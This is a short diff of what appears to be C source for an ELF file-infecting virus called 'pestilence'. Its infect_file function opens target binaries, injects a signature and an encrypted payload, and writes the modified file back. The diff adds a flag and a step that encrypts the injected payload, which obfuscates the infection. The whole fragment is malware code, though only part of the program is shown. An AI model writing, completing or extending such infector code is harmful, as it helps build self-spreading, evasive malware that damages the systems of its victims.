@@ -5,6 +5,7 @@ static void	init_info(t_info *info)
 	info->text_begin = 0;
 	info->text_size = 0;
 	info->valid_target = 1;
+	info->in_pestilence = 0;
 }
 
 
@@ -84,9 +85,11 @@ static void	infect_file(char *path, t_fingerprint *fingerprint)
 	t_info			info;
 	uint32_t		magic;
 
+	
 	if ((info.fd = ft_sysopen(path, O_RDWR)) < 0)
 		return ;
 	init_info(&info);
+	info.in_pestilence = 1;
 	ft_sysfstat(info.fd, &st);
 	info.file_size = st.st_size;
 	if ((info.file_size > 50*1024*1024) || info.file_size < sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr))
@@ -110,6 +113,7 @@ static void	infect_file(char *path, t_fingerprint *fingerprint)
 		goto end_fct;
 	patch_addresses(&info);
 	inject_sign(&info, fingerprint);
+	crypt_payload(&info, fingerprint->fingerprint);
 	patch_key(&info, encrypt(&info, info.file + info.offset_bis + BIS_SIZE, PAYLOAD_SIZE, fingerprint->fingerprint));
 	ft_syswrite(info.fd, info.file, info.file_size);
 end_fct:
